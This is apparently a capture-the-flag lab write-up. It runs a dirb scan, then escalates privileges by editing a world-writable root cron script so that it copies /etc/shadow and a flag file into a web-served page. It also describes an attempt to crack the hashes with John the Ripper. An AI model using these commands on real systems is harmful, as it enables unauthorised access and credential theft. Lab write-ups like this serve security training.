## TASK-1  How many pages did the dirb scan find with its default wordlist?

Run the command in your attacking machine ```dirb http://<MACHINE_IP>``` and you will find 4 pages with the default wordlist of dirb.

## TASK-2 How many scripts do you see in the /home/thegrinch/scripts folder?

Navigate to the folder and run the command ```ls -la``` to list out the scripts on the folder.
```
mcskidy@ip-10-10-27-222:/home/thegrinch/scripts$ ls -la
total 20
drwxr-xr-x 2 root      root      4096 Nov 11 20:03 .
drwxr-xr-x 7 thegrinch thegrinch 4096 Nov 11 19:50 ..
-rwx------ 1 root      root       286 Nov 11 20:03 check.sh
-rwx------ 1 root      root        58 Nov 11 09:00 cleanup.sh
-rwxrwxrwx 1 root      root        74 Dec 15 07:28 loot.sh
-rwx------ 1 root      root         0 Nov 11 07:58 test.sh

```

## TASK-3/4 What are the five characters following $6$G in pepper's password hash?

If you visit the page admin it has an iframe pointing to <b>ls.html</b> which is holding the contents of the ```ls -la /home/thegrinch/loot``` directory.<br>
In the scripts folder there is only one file to which we have permission to write i.e loot.sh. change the content to ```cat /etc/shadow > /var/www/html/ls.html```.<br>
And there you have the content of /etc/shadow.

This little script <b>loot.sh</b> is run every minute using cronjob which displays the content of /loot directory.<br> I tried to get the /etc/passwd and /etc/shadow
and tried to run JohnTheRipper using rockyou.txt but it didn't give any result. I was not able to crack the hash using <b>rockyou.txt.</b><br>

But, since we know the exact location of the flag.txt file, we can modify the loot.sh script.
```
cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
```
And wait for a few minute in the admin page and you should have the flag displayed.
